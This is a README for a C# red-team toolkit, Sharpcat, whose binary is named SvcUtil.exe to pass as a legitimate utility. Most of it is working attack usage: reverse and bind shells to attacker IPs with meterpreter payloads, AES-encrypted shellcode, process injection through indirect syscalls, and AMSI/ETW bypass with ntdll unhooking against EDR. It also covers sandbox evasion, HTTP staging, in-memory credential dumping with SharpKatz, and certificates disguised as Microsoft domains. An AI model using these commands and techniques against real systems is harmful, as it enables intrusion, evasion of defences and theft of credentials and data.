# Sharpcat

C# red team toolkit — enhanced netcat with OSEP-grade capabilities.
Rebuilt from [theart42/Sharpcat](https://github.com/theart42/Sharpcat).

## Build

### Option 1: build.bat (no SDK needed — uses built-in csc.exe)

```bash
# Just run the script — auto-detects csc.exe from .NET Framework
build.bat

# Debug build (with symbols)
build.bat Debug
```

Output: `SvcUtil.exe` in the project directory. Only requires .NET Framework 4.x which is pre-installed on Windows 10+, Windows 11, and Server 2019+. No Visual Studio or .NET SDK needed. Compatible with C# 5 / .NET Framework 4.0 csc.exe.

### Option 2: dotnet CLI (if .NET SDK installed)

```bash
dotnet build -c Release
```

---

## Payload Preparation

### Generate base64 from shellcode

```bash
# 1. Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.1 LPORT=443 -f raw -o payload.bin

# 2. Convert to base64 (Linux)
base64 -w0 payload.bin > shellcode.txt

# 2. Convert to base64 (Windows PowerShell)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.bin")) | Out-File shellcode.txt -NoNewline

# 3. Use with SvcUtil
SvcUtil.exe -s shellcode.txt
```

> **Tip:** `-s` accepts a file path or a base64 string directly. If the argument is an existing file, SvcUtil reads its content. Otherwise it treats it as raw base64.

### Create AES encrypted payload (.enc)

AES encryption hides shellcode from static analysis. Format: AES-256-CBC, key = SHA256(password), output = IV(16 bytes) + ciphertext.

**encrypt.py** — save this script alongside your payloads:

```python
#!/usr/bin/env python3
"""Encrypt a payload for SvcUtil -s <file> -p <password>"""
import sys, os, hashlib, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def encrypt(infile, password, outfile=None):
    key = hashlib.sha256(password.encode()).digest()
    iv = os.urandom(16)
    with open(infile, 'rb') as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(data, 16))
    result = base64.b64encode(iv + ct).decode()

    out = outfile or infile.rsplit('.', 1)[0] + '.enc'
    with open(out, 'w') as f:
        f.write(result)
    print(f"[+] {len(data)} bytes -> {out} (AES-CBC, SHA256 key)")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <payload.bin> <password> [output.enc]")
        sys.exit(1)
    encrypt(sys.argv[1], sys.argv[2],
            sys.argv[3] if len(sys.argv) > 3 else None)
```

```bash
# Encrypt
pip install pycryptodome
python3 encrypt.py payload.bin MyP@ssw0rd

# Use with SvcUtil
SvcUtil.exe -s payload.enc -p MyP@ssw0rd
```

### Prepare .NET assembly for --exec-asm

```bash
# Compile your tool or use a pre-built one (Seatbelt, Rubeus, etc.)
# Convert to base64
base64 -w0 Seatbelt.exe > seatbelt.b64

# Or AES encrypt it
python3 encrypt.py Seatbelt.exe MyP@ssw0rd seatbelt.enc
```

---

## 1. Listener (Attacker Side)

`listener.py` is the dedicated listener with XOR encryption and TLS support. It replaces nc/ncat for encrypted sessions.

```
                  XOR key: "Sh4rpC4tK3y!@#"
  [Attacker]  ◄────────────────────────────  [Target]
  listener.py                               SvcUtil.exe
  port 4444                                 connects to attacker
```

### XOR encrypted (default)

```bash
# Default key — must match SvcUtil's built-in key
python3 listener.py 4444 "Sh4rpC4tK3y!@#"

# Custom key — must match -k on target side
python3 listener.py 4444 "MyCustomK3y!!"
```

### TLS encrypted

```bash
# Auto-generate self-signed cert
python3 listener.py --tls 4444

# Custom certificate (for persistent operations)
python3 listener.py --tls 4444 --cert server.pem --key server.key
```

### Plaintext (no encryption)

```bash
# No key argument = plaintext mode
python3 listener.py 4444

# Or use standard nc/ncat (plaintext only)
nc -lvnp 4444
```

> **Note:** XOR encryption requires `listener.py` with the matching key. Standard `nc`/`ncat` only works in plaintext mode (`-n`) or TLS mode (`--tls` with `ncat --ssl`).

---

## 2. Reverse Shell — XOR Encrypted

**Theory:** Reverse shell connects FROM the target TO the attacker, bypassing inbound firewall rules. Traffic is encrypted with a rolling XOR cipher using a shared key — both sides must use the same key or data becomes garbled. The default key is `Sh4rpC4tK3y!@#` (XOR-obfuscated in the binary), so if you don't specify `-k`, both sides already agree.

### Default key (built-in key matches on both sides)

```bash
# Attacker
python3 listener.py 4444 "Sh4rpC4tK3y!@#"

# Target — uses default key, no -k needed
SvcUtil.exe -c 10.10.14.1 4444
```

### Custom key (override default on both sides)

```bash
# Attacker — use custom key
python3 listener.py 4444 "MyCustomK3y!!"

# Target — must specify the SAME key with -k
SvcUtil.exe -c 10.10.14.1 4444 -k "MyCustomK3y!!"
```

### With PowerShell (auto AMSI/ETW bypass)

```bash
# Attacker
python3 listener.py 4444 "Sh4rpC4tK3y!@#"

# Target — -e powershell.exe triggers automatic AMSI/ETW bypass
SvcUtil.exe -c 10.10.14.1 4444 -e powershell.exe
```

### With auto-reconnect

```bash
# Attacker
python3 listener.py 4444 "Sh4rpC4tK3y!@#"

# Target — -r enables reconnect with exponential backoff if connection drops
SvcUtil.exe -c 10.10.14.1 4444 -e powershell.exe -r
```

### Plaintext (no encryption)

```bash
# Attacker — no key argument = plaintext mode
python3 listener.py 4444

# Target — -n disables encryption
SvcUtil.exe -c 10.10.14.1 4444 -n
```

---

## 3. Reverse Shell — TLS Encrypted

**Theory:** TLS provides real HTTPS-level encryption. Traffic appears as normal HTTPS to network monitoring tools (IDS/IPS), making it harder to detect than XOR. The listener auto-generates a self-signed certificate if you don't provide one. SvcUtil accepts any certificate by default (self-signed OK).

```
                    TLS 1.2/1.3
  [Attacker]  ◄═══════════════════════════  [Target]
  listener.py --tls                        SvcUtil.exe --tls
  auto-generated cert                      accepts any cert
```

### Auto-generated certificate (simplest)

```bash
# Attacker — auto-generates self-signed cert via openssl
python3 listener.py --tls 4444

# Target — --tls connects via TLS, accepts self-signed cert
SvcUtil.exe -c 10.10.14.1 4444 --tls
```

### Custom certificate (for persistent operations)

```bash
# Generate your own cert (once)
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.pem \
  -days 365 -nodes -subj "/CN=windows.update.microsoft.com"

# Attacker — use custom cert
python3 listener.py --tls 4444 --cert server.pem --key server.key

# Target — same command, cert validation is on listener side
SvcUtil.exe -c 10.10.14.1 4444 --tls
```

> **Note:** SvcUtil's TLS client accepts any certificate (callback returns true). The cert/key configuration is only on the listener side. Use a domain name in the cert's CN field that blends with normal traffic.

---

## 4. Bind Shell

**Theory:** Bind shell is the reverse — the target LISTENS on a port, and the attacker connects TO it. Useful when the target has a public IP or you have already pivoted into the network. Requires the target's firewall to allow inbound connections on that port.

```
                    XOR encrypted
  [Attacker]  ═══════════════════════════►  [Target]
  nc / listener.py                         SvcUtil.exe -l
  connects to target                       listens on port
```

```bash
# Target — listen on port 4444
SvcUtil.exe -l 4444

# Attacker — connect with netcat (plaintext, since nc doesn't do XOR)
nc 10.10.10.5 4444

# Or use SvcUtil on attacker side too (XOR encrypted both ways)
SvcUtil.exe -c 10.10.10.5 4444
```

---

## 5. Local Shellcode Execution

**Theory:** Executes shellcode in the current process using W^X (Write-then-Execute) technique. Memory is allocated as RW, shellcode is copied in, then protection is changed to RX. This avoids having RWX memory pages, which is a common detection indicator. Shellcode is zeroed from managed memory after execution (anti-forensics).

### Execute directly (base64 on command line)

```bash
# Start Metasploit handler first
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 443; run"

# Target — paste base64 directly
SvcUtil.exe -s /EiD5PDowAAAAEFR...
```

### Execute from file (for long shellcode)

```bash
# Target — load base64 from file
SvcUtil.exe -s shellcode.txt
```

### With AES encryption (bypass static analysis)

```bash
# Encrypt (see Payload Preparation section above)
python3 encrypt.py payload.bin MyP@ssw0rd

# Target — decrypt and execute
SvcUtil.exe -s payload.enc -p MyP@ssw0rd
```

### Skip sandbox checks (for testing/debugging)

```bash
SvcUtil.exe -s shellcode.txt --no-sandbox
```

---

## 6. Process Injection — Threadless + Indirect Syscalls

**Theory:** Injects shellcode into another running process. Uses thread execution hijacking instead of CreateRemoteThread (which is heavily monitored by EDR). The technique suspends an existing thread in the target, redirects its instruction pointer (RIP) to the shellcode, then resumes it. All ntdll calls use indirect syscalls — SSNs are extracted from the clean on-disk ntdll.dll, and execution jumps through an in-memory `syscall;ret` gadget, bypassing userland hooks placed by EDR.

```
  SvcUtil.exe ──► target process (e.g. notepad.exe, PID 1234)
      │
      ├─ NtOpenProcess         ─── indirect syscall
      ├─ NtAllocateVirtualMemory (RW)
      ├─ NtWriteVirtualMemory   (copy shellcode)
      ├─ NtProtectVirtualMemory (RW → RX)
      ├─ Find thread via CreateToolhelp32Snapshot
      ├─ NtSuspendThread
      ├─ NtGetContextThread     (save RIP)
      ├─ NtSetContextThread     (RIP → shellcode)
      └─ NtResumeThread         (shellcode executes)
```

### By PID (numeric)

```bash
# Find target PID
tasklist | findstr notepad
# notepad.exe    1234    Console    1    12,345 K

# Start handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 443; run"

# Inject into PID 1234
SvcUtil.exe -i 1234 -s shellcode.txt
```

### By process name (auto-resolve PID)

```bash
# No need to look up PID — just use the process name
SvcUtil.exe -i notepad -s shellcode.txt

# With AES decryption
SvcUtil.exe -i explorer -s encrypted.txt -p MyPassword123
```

> **Note:** When using a process name, SvcUtil finds the first matching process via `Process.GetProcessesByName()`. Omit the `.exe` extension. x64 only.

---

## 7. File Transfer (within shell session)

**Theory:** Once you have a shell, you may need to transfer files. SvcUtil supports `!upload` and `!download` commands within the shell session, over the same encrypted channel.

```bash
# From the shell prompt:

# Upload file from attacker to target
!localupload /tmp/payload.exe C:\Windows\Temp\payload.exe

# Download file from target to attacker
!download C:\Users\admin\Desktop\secret.txt
```

---

## 8. Execute-Assembly (In-Memory .NET Loading)

**Theory:** Loads a .NET assembly (EXE) entirely in memory without touching disk. The assembly is transferred over the encrypted channel, loaded via `Assembly.Load(byte[])` in the SharpCat process, and its `Main()` is invoked with optional arguments. Because SharpCat's process already has AMSI and ETW patched, the loaded assembly is invisible to both — equivalent to Sliver's `execute-assembly` or Havoc's `dotnet inline-execute`, but without needing a full C2 framework.

### From the listener (recommended)

```bash
# Load and execute SharpKatz in-memory on the target
!localexec /path/to/SharpKatz.exe --Command logonpasswords

# With arguments
!localexec /path/to/Seatbelt.exe -group=all

# Execute Rubeus
!localexec /tools/Rubeus.exe triage
```

### Raw protocol (advanced — for custom tooling)

```bash
# From any client that speaks the SharpCat protocol:
# Send: !execute-assembly <size_in_bytes> [args...]
# Wait for: READY
# Send: <raw assembly bytes>
# Receive: output + DONE/ERR
```

### Standalone mode (--exec-asm)

Load and run a .NET assembly without a shell session — useful for one-shot execution:

```bash
# Basic: load from base64 file, no arguments to assembly
SvcUtil.exe --exec-asm -s seatbelt.b64

# With AES decryption
SvcUtil.exe --exec-asm -s seatbelt.enc -p MyP@ssw0rd

# Stage from HTTP
SvcUtil.exe --exec-asm --stage-http http://10.10.14.1/seatbelt.b64

# Stage from named pipe (see below)
SvcUtil.exe --exec-asm --stage-pipe mypipe
```

**Named pipe staging** — SvcUtil connects as a pipe client (`NamedPipeClientStream`). A pipe server must be running before SvcUtil connects. There are several ways to create one:

**Option 1: PowerShell (already have a shell on target)**

```powershell
$bytes = [IO.File]::ReadAllBytes("C:\staging\Seatbelt.exe")
$pipe = New-Object IO.Pipes.NamedPipeServerStream("mypipe", [IO.Pipes.PipeDirection]::Out)
$pipe.WaitForConnection()
$pipe.Write($bytes, 0, $bytes.Length)
$pipe.Close()
```

**Option 2: C# dropper (compile separately, run before SvcUtil)**

Save as `PipeDropper.cs`, build with csc.exe:

```csharp
using System;
using System.IO;
using System.IO.Pipes;

class PipeDropper
{
    static void Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.WriteLine("Usage: PipeDropper.exe <payload_file> <pipe_name>");
            return;
        }
        byte[] payload = File.ReadAllBytes(args[0]);
        using (var pipe = new NamedPipeServerStream(args[1], PipeDirection.Out))
        {
            Console.WriteLine("[*] Waiting for client on \\\\.\\pipe\\" + args[1]);
            pipe.WaitForConnection();
            pipe.Write(payload, 0, payload.Length);
            Console.WriteLine("[+] Sent " + payload.Length + " bytes");
        }
    }
}
```

```bash
# Build
csc.exe /out:PipeDropper.exe PipeDropper.cs

# Run dropper (waits for SvcUtil to connect)
PipeDropper.exe Seatbelt.exe mypipe

# In another window — SvcUtil reads from pipe
SvcUtil.exe --stage-pipe mypipe --exec-asm --amsi -- -group=all
```

**Option 3: Remote via SMB (from attacker machine)**

`--stage-pipe fileserver/mypipe` connects to `\\fileserver\pipe\mypipe`, allowing payload staging from another machine on the same network without HTTP.

**Passing arguments to the assembly** — use `--` to separate SvcUtil flags from assembly arguments:

```bash
# Everything after -- is passed to the assembly's Main(string[] args)
SvcUtil.exe --exec-asm -s seatbelt.b64 -- -group=all
SvcUtil.exe --exec-asm -s rubeus.enc -p MyP@ssw0rd -- triage
SvcUtil.exe --exec-asm -s sharpkatz.b64 -- --Command logonpasswords
```

In the examples above:
- `--exec-asm` tells SvcUtil to load the payload as a .NET assembly (not shellcode)
- `-s` / `-p` / `--stage-http` / `--stage-pipe` specify where and how to get the assembly bytes
- `--` marks the end of SvcUtil flags
- Everything after `--` becomes `args` in `Main(string[] args)` of the loaded assembly

```
  SvcUtil.exe --exec-asm -s rubeus.enc -p Pass123 -- triage
  │                                                    │
  │  SvcUtil flags                                     │  Assembly args
  │  --exec-asm    = load as .NET assembly             │  triage = passed to
  │  -s rubeus.enc = AES encrypted base64 source       │  Rubeus.Main(["triage"])
  │  -p Pass123    = AES decryption password           │
  └────────────────────────────────────────────────────┘
```

### Key advantages over PowerShell reflection

| | `!localexec` / `--exec-asm` | PowerShell `Assembly.Load` |
|---|---|---|
| Disk touch | None | None |
| AMSI | Pre-patched in process | Must bypass separately |
| ScriptBlock Logging | Not applicable (no PowerShell) | Logs reflection commands |
| Forensic trace | Minimal — no PowerShell artifacts | PowerShell event logs |
| Crash isolation | Same process (crash = lost shell) | Same process |

> **Note:** The loaded assembly runs in the same process as SharpCat. If it crashes, the shell session is lost. Assembly bytes are zeroed from memory after execution (anti-forensics).

---

## 9. Evasion Flags

### --amsi — Advanced AMSI/ETW Bypass

Combines two techniques in a single flag:

1. **ETW patch** — patches `EtwEventWrite` in ntdll.dll with `RET` (0xC3). Defender and EDR stop receiving ETW events from this process.
2. **HW breakpoint AMSI bypass** — sets a hardware breakpoint (DR0) on `AmsiScanBuffer` via a Vectored Exception Handler (VEH). When AMSI calls `AmsiScanBuffer`, the breakpoint fires, VEH sets the return value to `AMSI_RESULT_CLEAN` and skips the function.

```bash
# Shell mode — apply before spawning cmd/powershell
SvcUtil.exe -c 10.10.14.1 4444 --amsi

# Standalone assembly execution — apply before Assembly.Load
SvcUtil.exe --exec-asm -s tool.b64 --amsi -- -group=all
```

Hardware breakpoint is superior to memory patching (`xor eax,eax; ret` on amsi.dll) because:
- No code modification on amsi.dll — integrity checks pass
- No `PAGE_EXECUTE_READWRITE` on amsi.dll — no suspicious VirtualProtect calls
- Uses CPU debug registers (DR0-DR3) — transparent to userland hooks

### --unhook — Ntdll Unhooking

Restores the clean `.text` section of ntdll.dll from the on-disk copy in `System32`. This removes ALL inline hooks that EDR places on Nt* functions.

```bash
# Shell mode
SvcUtil.exe -c 10.10.14.1 4444 --unhook

# Combined with AMSI bypass (maximum evasion)
SvcUtil.exe -c 10.10.14.1 4444 --amsi --unhook
```

The recommended order for maximum bypass: ntdll unhooking runs first (restores clean syscall stubs), then ETW patch + AMSI bypass apply on the clean ntdll.

### Auto AMSI bypass (no flag needed)

When `-e powershell.exe` is used, SvcUtil automatically applies AMSI/ETW bypass via stdin reflection — no `--amsi` flag needed. The `--amsi` flag adds the more advanced HW breakpoint technique on top.

---

## Flags Reference

| Flag | Description |
|------|-------------|
| `<IP> <PORT>` | Reverse shell (positional, backward compatible) |
| `-c host port` | Reverse shell: connect to host:port |
| `-l port` | Bind shell: listen on port |
| `-e cmd` | Command to execute (default: cmd.exe) |
| `-k key` | XOR traffic encryption key (must match listener) |
| `-r` | Auto-reconnect on disconnect (exponential backoff + jitter) |
| `-n` | No encryption (plaintext) |
| `--tls` | Use TLS instead of XOR |
| `-s base64\|file` | Payload source: base64 string or file path |
| `-p password` | AES decryption password for payload |
| `--stage-http url` | Download payload from HTTP URL |
| `--stage-pipe name` | Read payload from named pipe |
| `--exec-asm` | Treat payload as .NET assembly (not shellcode) |
| `--` | Separator: everything after is passed to assembly's Main() |
| `-a` / `--amsi` | ETW patch + HW breakpoint AMSI bypass |
| `--unhook` | Restore clean ntdll.dll (remove EDR hooks) |
| `--no-sandbox` | Skip sandbox evasion checks |
| `-i pid\|name` | Target for injection: PID or process name |
| `--thread-inject` | Use thread injection instead of thread hijacking |
| `--ppid pid\|name` | PPID spoofing: create child under specified parent |

---

## Architecture

```
Program.cs           Entry point, argument parsing, mode dispatch
├── Config.cs        XOR-obfuscated defaults (IP, port, command, key)
├── DynInvoke.cs     Dynamic P/Invoke — runtime API resolution (no static IAT entries)
├── Connection.cs    TCP connectivity: reverse, bind, reconnect with exponential backoff
│
├── Shell Mode
│   ├── Shell.cs           Per-command execution loop with piped stdout/stderr
│   ├── IShellStream.cs    Interface for polymorphic stream handling
│   ├── Crypto.cs          XOR rolling-key stream cipher
│   ├── TlsStream.cs       SslStream wrapper — real TLS 1.2/1.3
│   ├── FileTransfer.cs    !upload / !download protocol
│   ├── AssemblyRunner.cs  !execute-assembly — in-memory .NET assembly loader (shell)
│   └── ScanPatch.cs       AMSI/ETW bypass (local patch + stdin reflection)
│
├── Evasion
│   ├── AmsiHwBp.cs        HW breakpoint AMSI bypass (VEH + DR0)
│   ├── NtdllUnhook.cs     Ntdll .text section restore from disk
│   └── Stager.cs          HTTP / named pipe payload staging
│
├── Shellcode Mode
│   ├── AesCrypto.cs       AES-CBC payload encryption/decryption
│   ├── AsmExec.cs         Standalone .NET assembly execution (--exec-asm)
│   ├── PayloadRunner.cs   W^X local shellcode execution
│   ├── EnvCheck.cs        5-gate sandbox/emulator detection
│   ├── Syscall.cs         Indirect syscall engine (SSN + gadget jump)
│   └── RemoteLoader.cs    Thread hijacking via indirect syscalls
│
├── listener.py      Python listener with XOR/TLS support
├── encrypt.py       AES payload encryption script
└── build.bat        Build script (csc.exe, no SDK needed)
```

## Evasion Techniques

| Technique | Module | How it works |
|-----------|--------|--------------|
| HW Breakpoint AMSI | AmsiHwBp.cs | VEH + DR0 on AmsiScanBuffer — no code modification, no VirtualProtect |
| ETW Patch | ScanPatch.cs | Patch EtwEventWrite with RET — disable ETW telemetry |
| Ntdll Unhooking | NtdllUnhook.cs | Restore clean .text from disk ntdll — remove ALL EDR inline hooks |
| Execute-Assembly | AssemblyRunner.cs, AsmExec.cs | In-memory .NET assembly load via `Assembly.Load(byte[])` — no disk, no PowerShell |
| Dynamic P/Invoke | DynInvoke.cs | Only LoadLibraryA/GetProcAddress in IAT — all other APIs resolved at runtime |
| Indirect Syscalls | Syscall.cs | SSN from clean disk ntdll + jump through in-memory `syscall;ret` gadget |
| Threadless Injection | RemoteLoader.cs | Thread execution hijacking — no CreateRemoteThread call |
| W^X Shellcode | PayloadRunner.cs | Allocate RW, copy, change to RX — never RWX |
| Stdin AMSI Bypass | ScanPatch.cs | Auto AMSI bypass for PowerShell via stdin reflection |
| AES Payload Encryption | AesCrypto.cs | AES-CBC with SHA256 key derivation — shellcode encrypted at rest |
| HTTP/Pipe Staging | Stager.cs | Download payload from HTTP or named pipe — no base64 on command line |
| Sandbox Evasion | EnvCheck.cs | Sleep timing, VirtualAllocExNuma, FlsAlloc, CPU count, uptime |
| TLS Encryption | TlsStream.cs | Real TLS — traffic indistinguishable from HTTPS |
| XOR String Obfuscation | All files | All sensitive strings stored as pre-computed XOR byte arrays |
| Traffic Encryption | Crypto.cs | Rolling XOR cipher for network traffic |

## Changing Default Configuration

Edit `Config.cs` and use the `Encode()` method to generate XOR-encoded byte arrays:

```csharp
byte[] encoded = Config.Encode("192.168.1.100");
// Copy the result into DefaultIpEncoded
```

## Requirements

- Windows 7+ / Server 2008 R2+
- .NET Framework 4.x (pre-installed on Windows)
- x64 (indirect syscalls + thread hijacking are x64 only)

## Known Limitations

- Threadless injection and indirect syscalls are x64 only
- TLS bind shell not supported (requires runtime certificate generation)
- AES uses SHA256 key derivation (no PBKDF2/salt) — adequate for payload protection, not for password storage
- AES-CBC without HMAC — sufficient for payload decryption, not for authenticated encryption

## License

For authorized security testing and educational purposes only.
